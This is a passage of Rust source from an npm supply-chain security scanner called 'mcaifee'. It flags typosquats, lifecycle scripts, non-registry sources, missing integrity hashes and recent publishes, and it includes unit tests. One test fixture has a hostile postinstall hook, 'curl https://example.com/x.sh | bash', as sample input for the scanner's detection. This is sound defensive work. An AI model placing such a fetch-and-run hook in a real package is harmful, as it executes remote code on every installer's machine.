            url: "https://jfrog.com/blog/",
        },
        SourceSummary {
            name: "Datadog security research",
            category: "supply-chain-intel",
            status: "corroborating",
            url: "https://securitylabs.datadoghq.com/",
        },
        SourceSummary {
            name: "Backstabbers Knife Collection",
            category: "malware-corpus",
            status: "corroborating",
            url: "https://dasfreak.github.io/Backstabbers-Knife-Collection/",
        },
        SourceSummary {
            name: "Aikido Security Intel",
            category: "supply-chain-intel",
            status: "corroborating",
            url: "https://www.aikido.dev/blog",
        },
        SourceSummary {
            name: "Wiz research",
            category: "supply-chain-intel",
            status: "corroborating",
            url: "https://www.wiz.io/blog",
        },
        SourceSummary {
            name: "Koi Security research",
            category: "supply-chain-intel",
            status: "corroborating",
            url: "https://www.koi.security/blog",
        },
        SourceSummary {
            name: "StepSecurity research",
            category: "supply-chain-intel",
            status: "corroborating",
            url: "https://www.stepsecurity.io/blog",
        },
    ]
}

fn recommended_next_steps(online: bool, paranoia: bool) -> Vec<String> {
    let mut steps = vec![
        "Run `npm audit --json` or OSV Scanner against the resolved lockfile.".to_string(),
        "Check OpenSSF malicious-packages and GitHub malware advisories for confirmed package reports.".to_string(),
        "Review lifecycle scripts, tarball source, integrity, maintainers, publish time, and provenance before approving install scripts.".to_string(),
    ];
    if !online {
        steps.push("Re-run `mcaifee report --online` when network access is allowed for npm registry metadata.".to_string());
    }
    if !paranoia {
        steps.push("Run `mcaifee npm install --paranoia` for a Docker behavior simulation before high-risk installs.".to_string());
    }
    steps
}

fn severity_counts(findings: &[Finding]) -> HashMap<String, usize> {
    let mut counts = HashMap::new();
    for finding in findings {
        *counts
            .entry(finding.severity.as_str().to_string())
            .or_default() += 1;
    }
    counts
}

fn render_report_text(report: &ReportOutput) -> String {
    let mut lines = vec![
        "mcaifee report".to_string(),
        format!("highest risk: {}", report.highest_risk),
        format!("scope: {}", report.scope.join(", ")),
        String::new(),
    ];
    if let Some(package_json) = &report.package_json {
        lines.push(format!(
            "package: {} {} ({})",
            package_json.name.as_deref().unwrap_or("<unnamed>"),
            package_json.version.as_deref().unwrap_or(""),
            package_json.path
        ));
        lines.push(format!(
            "dependency counts: {:?}",
            package_json.dependency_counts
        ));
        if !package_json.lifecycle_scripts.is_empty() {
            lines.push(format!(
                "lifecycle scripts: {}",
                package_json.lifecycle_scripts.join(", ")
            ));
        }
        lines.push(String::new());
    }
    lines.push("lockfiles:".to_string());
    for lockfile in &report.lockfiles {
        lines.push(format!(
            "- {} exists={} packages={} installScripts={} nonRegistrySources={}",
            lockfile.path,
            lockfile.exists,
            lockfile.package_count,
            lockfile.install_script_count,
            lockfile.non_registry_sources
        ));
    }
    lines.push(String::new());
    lines.push(render_text(&report.findings, &report.scope));
    lines.push(String::new());
    lines.push("sources:".to_string());
    for source in &report.sources {
        lines.push(format!(
            "- {} [{}] {} {}",
            source.name, source.category, source.status, source.url
        ));
    }
    lines.push(String::new());
    lines.push("next steps:".to_string());
    for step in &report.recommended_next_steps {
        lines.push(format!("- {step}"));
    }
    if let Some(paranoia) = &report.paranoia {
        lines.push(String::new());
        lines.push(format!(
            "paranoia: enabled image={} network={}",
            paranoia.image, paranoia.network
        ));
        lines.push(paranoia.note.clone());
    }
    lines.join("\n")
}

fn add_finding(
    findings: &mut Vec<Finding>,
    severity: Severity,
    target: impl Into<String>,
    code: impl Into<String>,
    message: impl Into<String>,
    evidence: Option<String>,
) {
    findings.push(Finding::new(severity, target, code, message, evidence));
}

fn add_source_db_findings(
    source_db: Option<&SourceDb>,
    name: &str,
    version: Option<&str>,
    target: &str,
    findings: &mut Vec<Finding>,
) {
    let Some(source_db) = source_db else {
        return;
    };
    let package = name.to_lowercase();
    for record in &source_db.records {
        if record.ecosystem != "npm" || record.package != package {
            continue;
        }
        let exact_match = version.is_some_and(|version| {
            record
                .versions
                .iter()
                .any(|affected| affected == version || affected == "*")
        });
        let package_level_match = record.versions.is_empty();
        if !exact_match && !package_level_match {
            continue;
        }
        let severity = parse_severity(&record.severity).unwrap_or(Severity::High);
        let matched = version
            .map(|version| format!("{package}@{version}"))
            .unwrap_or_else(|| package.clone());
        let aliases = if record.aliases.is_empty() {
            String::new()
        } else {
            format!(" aliases={}", record.aliases.join(","))
        };
        add_finding(
            findings,
            severity,
            target,
            "source_db_match",
            format!(
                "{} reports `{matched}` as affected: {}",
                record.source, record.summary
            ),
            Some(format!(
                "id={} confidence={} url={}{}",
                record.advisory_id, record.confidence, record.source_url, aliases
            )),
        );
    }
}

fn load_json(path: &PathBuf, findings: &mut Vec<Finding>, code: &str) -> Option<Value> {
    let contents = match fs::read_to_string(path) {
        Ok(contents) => contents,
        Err(error) => {
            add_finding(
                findings,
                Severity::High,
                path.display().to_string(),
                code,
                "Could not read JSON file.",
                Some(error.to_string()),
            );
            return None;
        }
    };
    match serde_json::from_str(&contents) {
        Ok(value) => Some(value),
        Err(error) => {
            add_finding(
                findings,
                Severity::High,
                path.display().to_string(),
                code,
                "Could not parse JSON file.",
                Some(error.to_string()),
            );
            None
        }
    }
}

fn package_name_from_spec(spec: &str) -> String {
    if is_non_registry_spec(spec) {
        return spec.to_string();
    }
    if spec.starts_with('@') {
        if let Some(scope_sep) = spec.find('/') {
            if let Some(version_sep) = spec[scope_sep + 1..].find('@') {
                return spec[..scope_sep + 1 + version_sep].to_string();
            }
        }
        return spec.to_string();
    }
    match spec.rfind('@') {
        Some(0) | None => spec.to_string(),
        Some(version_sep) => spec[..version_sep].to_string(),
    }
}

fn exact_version_from_spec(spec: &str) -> Option<String> {
    if is_non_registry_spec(spec) {
        return None;
    }
    let version_sep = if spec.starts_with('@') {
        let scope_sep = spec.find('/')?;
        spec[scope_sep + 1..]
            .find('@')
            .map(|index| scope_sep + 1 + index)?
    } else {
        match spec.rfind('@') {
            Some(0) | None => return None,
            Some(index) => index,
        }
    };
    let version = &spec[version_sep + 1..];
    if version.is_empty() || is_broad_range(version) || version == "latest" {
        None
    } else {
        Some(version.to_string())
    }
}

fn is_non_registry_spec(spec: &str) -> bool {
    let lowered = spec.to_lowercase();
    let prefixes = [
        "file:",
        "link:",
        "workspace:",
        "git:",
        "git+",
        "github:",
        "gitlab:",
        "bitbucket:",
        "http:",
        "https:",
        "ssh:",
    ];
    prefixes.iter().any(|prefix| lowered.starts_with(prefix)) || lowered.contains("://")
}

fn normalized_name(name: &str) -> String {
    name.to_lowercase()
        .chars()
        .filter(|ch| ch.is_ascii_alphanumeric())
        .collect()
}

fn levenshtein_limited(a: &str, b: &str, limit: usize) -> usize {
    if a.len().abs_diff(b.len()) > limit {
        return limit + 1;
    }
    let mut previous: Vec<usize> = (0..=b.len()).collect();
    for (i, ca) in a.chars().enumerate() {
        let mut current = vec![i + 1];
        let mut row_min = i + 1;
        for (j, cb) in b.chars().enumerate() {
            let cost = usize::from(ca != cb);
            let value = (current[j] + 1)
                .min(previous[j + 1] + 1)
                .min(previous[j] + cost);
            current.push(value);
            row_min = row_min.min(value);
        }
        if row_min > limit {
            return limit + 1;
        }
        previous = current;
    }
    previous[b.len()]
}

fn find_typosquat_candidate(name: &str) -> Option<&'static str> {
    if popular_packages().contains(name) {
        return None;
    }
    let norm = normalized_name(name);
    if norm.len() < 5 {
        return None;
    }
    for baseline in popular_packages() {
        let baseline_norm = normalized_name(baseline);
        if baseline_norm == norm {
            continue;
        }
        let distance = levenshtein_limited(&norm, &baseline_norm, 2);
        if distance == 1 || (distance == 2 && baseline_norm.len() >= 8) {
            return Some(baseline);
        }
    }
    None
}

fn analyze_package_name(name: &str, findings: &mut Vec<Finding>, target: &str) {
    let clean_name = name.to_lowercase();
    let unscoped = clean_name
        .split('/')
        .next_back()
        .unwrap_or(clean_name.as_str());
    if node_core_modules().contains(clean_name.as_str()) || node_core_modules().contains(unscoped) {
        add_finding(
            findings,
            Severity::High,
            target,
            "core_module_shadow",
            format!("Package name shadows Node.js core module `{unscoped}`."),
            None,
        );
    }
    if let Some(typo_target) = find_typosquat_candidate(&clean_name) {
        add_finding(
            findings,
            Severity::High,
            target,
            "possible_typosquat",
            format!("Package name is very similar to popular package `{typo_target}`."),
            None,
        );
    }
}

fn analyze_dependency_spec(
    name: &str,
    spec: &Value,
    findings: &mut Vec<Finding>,
    section: &str,
    strict_ranges: bool,
    source_db: Option<&SourceDb>,
) {
    let target = format!("{section}:{name}");
    analyze_package_name(name, findings, &target);
    let Some(spec) = spec.as_str() else {
        return;
    };
    add_source_db_findings(
        source_db,
        name,
        exact_version_from_spec(&format!("{name}@{spec}")).as_deref(),
        &target,
        findings,
    );
    let lowered = spec.to_lowercase();
    if lowered.starts_with("http:") {
        add_finding(
            findings,
            Severity::Critical,
            &target,
            "http_dependency",
            "Dependency uses an HTTP URL.",
            Some(spec.to_string()),
        );
    } else if lowered.starts_with("https:")
        || lowered.starts_with("git:")
        || lowered.starts_with("git+")
        || lowered.starts_with("github:")
        || lowered.starts_with("gitlab:")
        || lowered.starts_with("bitbucket:")
        || lowered.starts_with("ssh:")
    {
        let severity = if section == "devDependencies" {
            Severity::Medium
        } else {
            Severity::High
        };
        add_finding(
            findings,
            severity,
            &target,
            "non_registry_dependency",
            "Dependency bypasses the normal npm registry resolution path.",
            Some(spec.to_string()),
        );
    } else if lowered.starts_with("file:")
        || lowered.starts_with("link:")
        || lowered.starts_with("workspace:")
    {
        add_finding(
            findings,
            Severity::Medium,
            &target,
            "local_or_workspace_dependency",
            "Dependency resolves from local/workspace path; verify it is expected.",
            Some(spec.to_string()),
        );
    } else if strict_ranges && is_broad_range(spec) {
        add_finding(
            findings,
            Severity::Low,
            &target,
            "broad_version_range",
            "Dependency uses a broad version range; prefer exact pins for elevated-risk packages.",
            Some(spec.to_string()),
        );
    }
}

fn is_broad_range(spec: &str) -> bool {
    let first = spec.chars().next();
    matches!(first, Some('^' | '~' | '*' | 'x' | 'X')) || spec.contains(['<', '>', '=', '|'])
}

fn analyze_scripts(scripts: Option<&Value>, findings: &mut Vec<Finding>, target: &str) {
    let Some(scripts) = scripts.and_then(Value::as_object) else {
        return;
    };
    let lifecycle_names = [
        "preinstall",
        "install",
        "postinstall",
        "prepublish",
        "prepublishOnly",
        "prepare",
        "prepack",
        "postpack",
    ];
    for (script_name, script_value) in scripts {
        let Some(script_value) = script_value.as_str() else {
            continue;
        };
        let script_target = format!("{target}:scripts.{script_name}");
        if lifecycle_names.contains(&script_name.as_str()) {
            add_finding(
                findings,
                Severity::Medium,
                &script_target,
                "lifecycle_script",
                "Package defines a lifecycle script that can run during install or publish.",
                Some(script_value.to_string()),
            );
        }
        for pattern in suspicious_script_patterns() {
            if pattern.regex.is_match(script_value) {
                add_finding(
                    findings,
                    pattern.severity,
                    &script_target,
                    pattern.code,
                    pattern.message,
                    Some(script_value.to_string()),
                );
            }
        }
    }
}

fn analyze_package_json(
    path: &PathBuf,
    findings: &mut Vec<Finding>,
    strict_ranges: bool,
    source_db: Option<&SourceDb>,
) {
    let Some(data) = load_json(path, findings, "invalid_package_json") else {
        return;
    };
    let target = path.display().to_string();
    let Some(root) = data.as_object() else {
        add_finding(
            findings,
            Severity::High,
            &target,
            "invalid_package_json",
            "package.json root is not an object.",
            None,
        );
        return;
    };
    if let Some(name) = root.get("name").and_then(Value::as_str) {
        analyze_package_name(name, findings, &format!("{target}:name"));
    }
    analyze_scripts(root.get("scripts"), findings, &target);
    if root
        .get("bin")
        .is_some_and(|bin| bin.is_string() || bin.is_object())
    {
        add_finding(
            findings,
            Severity::Low,
            format!("{target}:bin"),
            "package_bin",
            "Package exposes executable binaries; verify CLI behavior before trusting it.",
            None,
        );
    }
    if let Some(registry) = root
        .get("publishConfig")
        .and_then(Value::as_object)
        .and_then(|publish_config| publish_config.get("registry"))
        .and_then(Value::as_str)
    {
        if !registry.contains("registry.npmjs.org") {
            add_finding(
                findings,
                Severity::Medium,
                format!("{target}:publishConfig.registry"),
                "custom_publish_registry",
                "Package uses a custom publish registry.",
                Some(registry.to_string()),
            );
        }
    }
    for section in [
        "dependencies",
        "optionalDependencies",
        "peerDependencies",
        "devDependencies",
    ] {
        let Some(dependencies) = root.get(section).and_then(Value::as_object) else {
            continue;
        };
        for (dep_name, dep_spec) in dependencies {
            analyze_dependency_spec(
                dep_name,
                dep_spec,
                findings,
                section,
                strict_ranges,
                source_db,
            );
        }
    }
}

fn package_name_from_lock_path(lock_path: &str) -> Option<String> {
    if lock_path.is_empty() {
        return None;
    }
    let tail = lock_path.split("node_modules/").last()?;
    let parts: Vec<&str> = tail.split('/').filter(|part| !part.is_empty()).collect();
    if parts.is_empty() {
        return None;
    }
    if parts[0].starts_with('@') && parts.len() > 1 {
        Some(format!("{}/{}", parts[0], parts[1]))
    } else {
        Some(parts[0].to_string())
    }
}

fn host_allowed(url: &str, allowed_hosts: &HashSet<String>) -> bool {
    Url::parse(url)
        .ok()
        .and_then(|parsed| parsed.host_str().map(str::to_lowercase))
        .is_some_and(|host| allowed_hosts.contains(&host))
}

fn analyze_resolved_url(
    resolved: &str,
    target: &str,
    findings: &mut Vec<Finding>,
    allowed_hosts: &HashSet<String>,
) {
    let lowered = resolved.to_lowercase();
    if lowered.starts_with("http://") {
        add_finding(
            findings,
            Severity::Critical,
            target,
            "http_tarball",
            "Lockfile resolves a tarball over HTTP.",
            Some(resolved.to_string()),
        );
    } else if lowered.starts_with("https://") && !lockfile_host_allowed(resolved, allowed_hosts) {
        add_finding(
            findings,
            Severity::Medium,
            target,
            "non_allowed_registry",
            "Lockfile resolves from a host outside the allowed registry list.",
            Some(resolved.to_string()),
        );
    } else if lowered.starts_with("git:")
        || lowered.starts_with("git+")
        || lowered.starts_with("github:")
        || lowered.starts_with("gitlab:")
        || lowered.starts_with("bitbucket:")
        || lowered.starts_with("ssh:")
    {
        add_finding(
            findings,
            Severity::High,
            target,
            "git_lockfile_source",
            "Lockfile resolves from a Git or SSH source instead of an immutable registry tarball.",
            Some(resolved.to_string()),
        );
    } else if lowered.starts_with("file:")
        || lowered.starts_with("link:")
        || lowered.starts_with("workspace:")
        || lowered.starts_with("patch:")
    {
        add_finding(
            findings,
            Severity::Medium,
            target,
            "local_or_workspace_dependency",
            "Dependency resolves from local/workspace path; verify it is expected.",
            Some(resolved.to_string()),
        );
    }
}

fn analyze_lock_package(
    name: &str,
    meta: &serde_json::Map<String, Value>,
    target: &str,
    findings: &mut Vec<Finding>,
    allowed_hosts: &HashSet<String>,
    source_db: Option<&SourceDb>,
) {
    analyze_package_name(name, findings, target);
    let version = meta.get("version").and_then(Value::as_str);
    add_source_db_findings(source_db, name, version, target, findings);
    let resolved = meta.get("resolved").and_then(Value::as_str);
    let integrity = meta.get("integrity").and_then(Value::as_str);
    if let Some(resolved) = resolved {
        analyze_resolved_url(resolved, target, findings, allowed_hosts);
        if (resolved.starts_with("http://") || resolved.starts_with("https://"))
            && integrity.is_none()
        {
            add_finding(
                findings,
                Severity::High,
                target,
                "missing_integrity",
                "Registry tarball has no integrity hash in the lockfile.",
                Some(resolved.to_string()),
            );
        }
    }
    if meta.get("hasInstallScript").and_then(Value::as_bool) == Some(true) {
        add_finding(
            findings,
            Severity::Medium,
            target,
            "lockfile_install_script",
            "Lockfile marks this package as having an install lifecycle script.",
            None,
        );
    }
    if let Some(deprecated) = meta.get("deprecated") {
        if !deprecated.is_null() && deprecated != &Value::Bool(false) {
            add_finding(
                findings,
                Severity::Medium,
                target,
                "deprecated_package",
                "Lockfile package is deprecated.",
                Some(value_to_evidence(deprecated)),
            );
        }
    }
    if meta.get("bin").is_some() {
        add_finding(
            findings,
            Severity::Low,
            target,
            "lockfile_bin",
            "Package exposes executable binaries; verify CLI behavior before trusting it.",
            None,
        );
    }
}

fn analyze_lockfile(
    path: &PathBuf,
    findings: &mut Vec<Finding>,
    allowed_hosts: &HashSet<String>,
    source_db: Option<&SourceDb>,
) {
    if is_bun_binary_lockfile(path) {
        add_finding(
            findings,
            Severity::Medium,
            path.display().to_string(),
            "binary_bun_lockfile",
            "Bun binary lockfile cannot be fully audited; migrate to text bun.lock or generate a Yarn-compatible lockfile for review.",
            None,
        );
        return;
    }
    if !is_npm_json_lockfile(path) {
        if let Some(signals) = parse_text_lockfile_signals(path, allowed_hosts) {
            analyze_text_lockfile_signals(signals, findings, allowed_hosts, source_db);
        } else {
            add_finding(
                findings,
                Severity::Info,
                path.display().to_string(),
                "lockfile_not_parsed",
                "Lockfile format is not parsed yet; package specs and package.json were still gated.",
                None,
            );
        }
        return;
    }

    let Some(data) = load_json(path, findings, "invalid_lockfile") else {
        return;
    };
    let Some(root) = data.as_object() else {
        add_finding(
            findings,
            Severity::High,
            path.display().to_string(),
            "invalid_lockfile",
            "Lockfile root is not an object.",
            None,
        );
        return;
    };
    let mut seen_names: HashMap<String, usize> = HashMap::new();
    if let Some(packages) = root.get("packages").and_then(Value::as_object) {
        for (lock_path, meta) in packages {
            let Some(meta) = meta.as_object() else {
                continue;
            };
            let target = format!(
                "{}:{}",
                path.display(),
                if lock_path.is_empty() {
                    "<root>"
                } else {
                    lock_path
                }
            );
            if let Some(name) = package_name_from_lock_path(lock_path) {
                *seen_names.entry(name.clone()).or_default() += 1;
                analyze_lock_package(&name, meta, &target, findings, allowed_hosts, source_db);
            } else {
                analyze_scripts(meta.get("scripts"), findings, &target);
            }
        }
    }
    if let Some(dependencies) = root.get("dependencies").and_then(Value::as_object) {
        analyze_lockfile_v1_dependencies(
            path,
            dependencies,
            findings,
            allowed_hosts,
            &mut seen_names,
            "",
            source_db,
        );
    }
    for (name, count) in seen_names {
        if count >= 4 {
            add_finding(
                findings,
                Severity::Low,
                format!("{}:{name}", path.display()),
                "many_duplicate_versions",
                "Package appears in several lockfile locations; review version fanout.",
                Some(count.to_string()),
            );
        }
    }
}

fn analyze_lockfile_v1_dependencies(
    path: &PathBuf,
    dependencies: &serde_json::Map<String, Value>,
    findings: &mut Vec<Finding>,
    allowed_hosts: &HashSet<String>,
    seen_names: &mut HashMap<String, usize>,
    prefix: &str,
    source_db: Option<&SourceDb>,
) {
    for (name, meta) in dependencies {
        let Some(meta) = meta.as_object() else {
            continue;
        };
        *seen_names.entry(name.clone()).or_default() += 1;
        let target = format!("{}:dependencies.{}{}", path.display(), prefix, name);
        analyze_lock_package(name, meta, &target, findings, allowed_hosts, source_db);
        if let Some(nested) = meta.get("dependencies").and_then(Value::as_object) {
            analyze_lockfile_v1_dependencies(
                path,
                nested,
                findings,
                allowed_hosts,
                seen_names,
                &format!("{prefix}{name}."),
                source_db,
            );
        }
    }
}

fn run_npm_view(spec: &str, _timeout: u64) -> Result<Value, String> {
    let output = Command::new("npm")
        .args(["view", spec, "--json"])
        .env("NPM_CONFIG_FUND", "false")
        .env("NPM_CONFIG_AUDIT", "false")
        .env("NPM_CONFIG_CACHE", mcaifee_npm_cache_dir())
        .env("npm_config_cache", mcaifee_npm_cache_dir())
        .output()
        .map_err(|error| format!("npm view failed to start: {error}"))?;
    if !output.status.success() {
        let stderr = String::from_utf8_lossy(&output.stderr).trim().to_string();
        let stdout = String::from_utf8_lossy(&output.stdout).trim().to_string();
        return Err(if stderr.is_empty() { stdout } else { stderr });
    }
    serde_json::from_slice(&output.stdout)
        .map_err(|error| format!("npm view returned invalid JSON: {error}"))
}

fn run_npm_view_time(name: &str, _timeout: u64) -> Option<Value> {
    Command::new("npm")
        .args(["view", name, "time", "--json"])
        .env("NPM_CONFIG_FUND", "false")
        .env("NPM_CONFIG_AUDIT", "false")
        .env("NPM_CONFIG_CACHE", mcaifee_npm_cache_dir())
        .env("npm_config_cache", mcaifee_npm_cache_dir())
        .output()
        .ok()
        .filter(|output| output.status.success())
        .and_then(|output| serde_json::from_slice(&output.stdout).ok())
}

fn analyze_online_spec(
    spec: &str,
    findings: &mut Vec<Finding>,
    allowed_hosts: &HashSet<String>,
    timeout: u64,
) {
    let name = package_name_from_spec(spec);
    analyze_package_name(&name, findings, spec);
    let mut manifest = match run_npm_view(spec, timeout) {
        Ok(manifest) => manifest,
        Err(error) => {
            add_finding(
                findings,
                Severity::High,
                spec,
                "npm_view_failed",
                "Could not retrieve registry metadata.",
                Some(error),
            );
            return;
        }
    };
    if let Some(array) = manifest.as_array() {
        manifest = array.last().cloned().unwrap_or(Value::Null);
    }
    let Some(root) = manifest.as_object() else {
        add_finding(
            findings,
            Severity::High,
            spec,
            "invalid_registry_metadata",
            "npm view did not return an object.",
            None,
        );
        return;
    };
    let registry_name = root.get("name").and_then(Value::as_str);
    let time_info = registry_name.and_then(|name| run_npm_view_time(name, timeout));
    analyze_online_manifest(spec, root, time_info.as_ref(), findings, allowed_hosts);
}

fn analyze_online_manifest(
    spec: &str,
    manifest: &serde_json::Map<String, Value>,
    time_info: Option<&Value>,
    findings: &mut Vec<Finding>,
    allowed_hosts: &HashSet<String>,
) {
    let target = manifest
        .get("name")
        .and_then(Value::as_str)
        .unwrap_or(spec)
        .to_string();
    if let Some(name) = manifest.get("name").and_then(Value::as_str) {
        analyze_package_name(name, findings, &target);
    }
    if let Some(deprecated) = manifest.get("deprecated") {
        if !deprecated.is_null() && deprecated != &Value::Bool(false) {
            add_finding(
                findings,
                Severity::Medium,
                &target,
                "deprecated_package",
                "Registry metadata marks this package as deprecated.",
                Some(value_to_evidence(deprecated)),
            );
        }
    }
    analyze_scripts(manifest.get("scripts"), findings, &target);
    if let Some(dist) = manifest.get("dist").and_then(Value::as_object) {
        if let Some(tarball) = dist.get("tarball").and_then(Value::as_str) {
            analyze_resolved_url(tarball, &target, findings, allowed_hosts);
            if (tarball.starts_with("http://") || tarball.starts_with("https://"))
                && dist.get("integrity").is_none()
            {
                add_finding(
                    findings,
                    Severity::Medium,
                    &target,
                    "registry_missing_integrity",
                    "Registry metadata has no dist.integrity for the tarball.",
                    Some(tarball.to_string()),
                );
            }
        }
    }
    if let Some(maintainers) = manifest.get("maintainers").and_then(Value::as_array) {
        if maintainers.is_empty() {
            add_finding(
                findings,
                Severity::Medium,
                &target,
                "no_maintainers",
                "Registry metadata lists no maintainers.",
                None,
            );
        } else if maintainers.len() == 1 {
            add_finding(
                findings,
                Severity::Low,
                &target,
                "single_maintainer",
                "Package has a single listed maintainer; review takeover risk for sensitive use.",
                None,
            );
        }
    }
    if manifest.get("bin").is_some() {
        add_finding(
            findings,
            Severity::Low,
            &target,
            "package_bin",
            "Package exposes executable binaries; verify CLI behavior before trusting it.",
            None,
        );
    }
    if !manifest.contains_key("repository") {
        add_finding(
            findings,
            Severity::Low,
            &target,
            "missing_repository",
            "Registry metadata has no repository field.",
            None,
        );
    }
    if !manifest.contains_key("license") {
        add_finding(
            findings,
            Severity::Low,
            &target,
            "missing_license",
            "Registry metadata has no license field.",
            None,
        );
    }
    if let Some(dep_count) = manifest
        .get("dependencies")
        .and_then(Value::as_object)
        .map(serde_json::Map::len)
    {
        if dep_count >= 25 {
            add_finding(
                findings,
                Severity::Low,
                &target,
                "large_dependency_fanout",
                "Package pulls in a large number of direct dependencies.",
                Some(dep_count.to_string()),
            );
        }
    }
    if let Some(time_info) = time_info {
        analyze_publish_times(
            &target,
            manifest.get("version").and_then(Value::as_str),
            time_info,
            findings,
        );
    }
}

fn parse_npm_datetime(value: &str) -> Option<DateTime<Utc>> {
    DateTime::parse_from_rfc3339(value)
        .ok()
        .map(|parsed| parsed.with_timezone(&Utc))
}

fn analyze_publish_times(
    name: &str,
    version: Option<&str>,
    time_info: &Value,
    findings: &mut Vec<Finding>,
) {
    let Some(time_info) = time_info.as_object() else {
        return;
    };
    let now = Utc::now();
    if let Some(version) = version {
        if let Some(published_at) = time_info
            .get(version)
            .and_then(Value::as_str)
            .and_then(parse_npm_datetime)
        {
            let age = now - published_at;
            if age < Duration::days(1) {
                add_finding(
                    findings,
                    Severity::High,
                    name,
                    "very_recent_publish",
                    "Package version was published less than 24 hours ago.",
                    Some(published_at.to_rfc3339()),
                );
            } else if age < Duration::days(7) {
                add_finding(
                    findings,
                    Severity::Medium,
                    name,
                    "recent_publish",
                    "Package version was published less than 7 days ago.",
                    Some(published_at.to_rfc3339()),
                );
            }
        }
    }
    if let Some(created_at) = time_info
        .get("created")
        .and_then(Value::as_str)
        .and_then(parse_npm_datetime)
    {
        if now - created_at < Duration::days(30) {
            add_finding(
                findings,
                Severity::High,
                name,
                "new_package",
                "Package was created less than 30 days ago.",
                Some(created_at.to_rfc3339()),
            );
        }
    }
}

fn highest_severity(findings: &[Finding]) -> String {
    findings
        .iter()
        .max_by_key(|finding| finding.severity.score())
        .map(|finding| finding.severity.as_str().to_string())
        .unwrap_or_else(|| "none".to_string())
}

fn render_text(findings: &[Finding], scopes: &[String]) -> String {
    let mut lines = vec![
        "mcaifee scan".to_string(),
        format!(
            "scope: {}",
            if scopes.is_empty() {
                "package specs".to_string()
            } else {
                scopes.join(", ")
            }
        ),
        format!("highest risk: {}", highest_severity(findings)),
        String::new(),
    ];
    if findings.is_empty() {
        lines.push(
            "No findings. This is not proof of safety; it means the configured checks did not flag risk."
                .to_string(),
        );
        return lines.join("\n");
    }
    let mut counts: HashMap<&'static str, usize> = HashMap::new();
    for finding in findings {
        *counts.entry(finding.severity.as_str()).or_default() += 1;
    }
    let summary = [
        Severity::Critical,
        Severity::High,
        Severity::Medium,
        Severity::Low,
        Severity::Info,
    ]
    .into_iter()
    .filter_map(|severity| {
        counts
            .get(severity.as_str())
            .map(|count| format!("{}={count}", severity.as_str()))
    })
    .collect::<Vec<_>>()
    .join(", ");
    lines.push(format!("summary: {summary}"));
    lines.push(String::new());
    let mut sorted = findings.to_vec();
    sorted.sort_by_key(|finding| {
        (
            Reverse(finding.severity.score()),
            finding.target.clone(),
            finding.code.clone(),
        )
    });
    for finding in sorted {
        lines.push(format!(
            "[{}] {} {}: {}",
            finding.severity.as_str().to_uppercase(),
            finding.target,
            finding.code,
            finding.message
        ));
        if let Some(evidence) = finding.evidence {
            lines.push(format!("  evidence: {evidence}"));
        }
    }
    lines.join("\n")
}

fn value_to_evidence(value: &Value) -> String {
    value
        .as_str()
        .map(str::to_string)
        .unwrap_or_else(|| value.to_string())
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::io::Write;

    #[test]
    fn extracts_scoped_package_names_from_specs() {
        assert_eq!(package_name_from_spec("@scope/pkg@1.2.3"), "@scope/pkg");
        assert_eq!(package_name_from_spec("react@18.2.0"), "react");
        assert_eq!(package_name_from_spec("react"), "react");
    }

    #[test]
    fn flags_package_name_risk() {
        let mut findings = Vec::new();
        analyze_package_name("reactt", &mut findings, "reactt");
        analyze_package_name("fs", &mut findings, "fs");
        assert!(findings
            .iter()
            .any(|finding| finding.code == "possible_typosquat"));
        assert!(findings
            .iter()
            .any(|finding| finding.code == "core_module_shadow"));
    }

    #[test]
    fn analyzes_package_json_and_lockfile() {
        let dir = tempfile::tempdir().unwrap();
        let package_path = dir.path().join("package.json");
        let lock_path = dir.path().join("package-lock.json");

        write!(
            fs::File::create(&package_path).unwrap(),
            r#"{{
                "name": "demo",
                "scripts": {{"postinstall": "curl https://example.com/x.sh | bash"}},
                "dependencies": {{
                    "reactt": "^1.0.0",
                    "fs": "latest",
                    "left-pad": "git+ssh://git@example.com/left-pad.git"
                }}
            }}"#
        )
        .unwrap();
        write!(
            fs::File::create(&lock_path).unwrap(),
            r#"{{
                "lockfileVersion": 3,
                "packages": {{
                    "": {{"name": "demo"}},
                    "node_modules/reactt": {{
                        "version": "1.0.0",
                        "resolved": "https://registry.npmjs.org/reactt/-/reactt-1.0.0.tgz",
                        "integrity": "sha512-test"
                    }},
                    "node_modules/badpkg": {{
                        "version": "1.0.0",
                        "resolved": "http://example.com/badpkg.tgz",
                        "hasInstallScript": true
                    }}
                }}
            }}"#
        )
        .unwrap();

        let mut findings = Vec::new();
        let allowed_hosts = HashSet::from(["registry.npmjs.org".to_string()]);
        analyze_package_json(&package_path, &mut findings, true, None);
        analyze_lockfile(&lock_path, &mut findings, &allowed_hosts, None);

        assert!(findings
            .iter()
            .any(|finding| finding.code == "network_download"));
        assert!(findings
            .iter()
            .any(|finding| finding.code == "http_tarball"));
        assert!(findings
            .iter()
            .any(|finding| finding.code == "missing_integrity"));
        assert_eq!(highest_severity(&findings), "critical");
    }

    #[test]
    fn parses_wrapper_options_without_forwarding_them() {
        let args = vec![
            "install".to_string(),
            "--paranoia".to_string(),
            "--mcaifee-fail-on".to_string(),
            "high".to_string(),
            "react".to_string(),
        ];

        let (options, forwarded) = parse_wrapper_options(&args);

        assert!(options.paranoia);
        assert_eq!(options.fail_on, Some(Severity::High));
        assert_eq!(forwarded, vec!["install".to_string(), "react".to_string()]);
    }

    #[test]
    fn parses_pnpm_install_paranoia_shape() {
        let args = vec!["install".to_string(), "--paranoia".to_string()];

        let (options, forwarded) = parse_wrapper_options(&args);

        assert!(options.paranoia);
        assert_eq!(forwarded, vec!["install".to_string()]);
    }

    #[test]
    fn parses_wrapper_equals_options_without_forwarding_them() {
        let args = vec![
            "install".to_string(),
            "--mcaifee-paranoia".to_string(),
            "--mcaifee-fail-on=critical".to_string(),
            "vite".to_string(),
        ];

        let (options, forwarded) = parse_wrapper_options(&args);

        assert!(options.paranoia);
        assert_eq!(options.fail_on, Some(Severity::Critical));
        assert_eq!(forwarded, vec!["install".to_string(), "vite".to_string()]);
    }

    #[test]
    fn extracts_specs_after_package_manager_options() {
        let args = vec![
            "--prefix".to_string(),
            "app".to_string(),
            "install".to_string(),
            "--save-dev".to_string(),
            "reactt".to_string(),
            "--registry".to_string(),
            "https://registry.npmjs.org".to_string(),
            "fs".to_string(),
        ];

        assert_eq!(first_command_arg(&args), Some("install"));
        assert_eq!(
            extract_package_specs("npm", &args),
            vec!["reactt".to_string(), "fs".to_string()]
        );
    }

    #[test]
    fn npm_staging_args_add_script_safe_flags_once() {
        let args = vec![
            "install".to_string(),
            "--ignore-scripts".to_string(),
